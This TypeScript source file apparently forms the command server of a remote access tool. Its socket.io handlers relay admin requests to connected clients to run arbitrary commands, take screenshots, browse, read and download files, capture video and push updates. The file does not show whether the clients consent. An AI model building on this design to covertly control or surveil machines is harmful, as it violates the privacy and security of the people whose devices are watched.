import myUtils from "../utils";
import { IOS } from "../socketServer";

export default function adminIoInit(ios: IOS) {
  const { userIo, adminIo } = ios;
  adminIo.on("connection", (sk) => {
    sk.on("apidialog", (id) => {
      userIo.to(id).emit("dialog");
    });
    sk.on("apigetallclients", () => {
      // console.log(clientArr)
      sk.emit("apigetallclients", myUtils.clientArr);
    });

    sk.on("apisendcmd", (id, cmd) => {
      console.log(id, cmd);
      userIo.to(id).emit("exec", cmd);
    });

    sk.on("apiupdateallclients", (update_name) => {
      userIo.emit("version_update", update_name);
    });

    sk.on("apiupdatethisclient", (id, update_name) => {
      userIo.to(id).emit("version_update", update_name);
    });

    sk.on("apiupdatethisclientcore", (id, update_name) => {
      userIo.to(id).emit("version_update", update_name);
    });

    sk.on("apiupdatethisclientutils", (id, update_name) => {
      userIo.to(id).emit("utils_update", update_name);
    });

    sk.on("apireload", () => {
      userIo.to(sk.id).emit("reload"); // ?
    });

    sk.on("apigetscreenshot", (id) => {
      userIo.to(id).emit("screenshot");
    });

    //FileExplorer
    sk.on("apilistdir", (id, dir) => {
      userIo.to(id).emit("listdir", dir);
    });

    sk.on("apishowfilecontent", (id, fileName) => {
      userIo.to(id).emit("showfilecontent", fileName);
    });

    sk.on("apidownloadfile", (id, fileName) => {
      // ss(sk).to(id).emit("downloadfile", fileName);
      console.log(fileName);
      userIo.to(id).emit("downloadfile", fileName);
    });

    sk.on("apistartvideocapture", (id) => {
      userIo.to(id).emit("startvideocapture", id);
      myUtils.clientArr[myUtils.IdIndex(id)].streaming = true;
    });

    sk.on("apistopvideocapture", (id) => {
      userIo.to(id).emit("stopvideocapture");
      myUtils.clientArr[myUtils.IdIndex(id)].streaming = false;
    });
  });
}

// module.exports = adminIoInit;
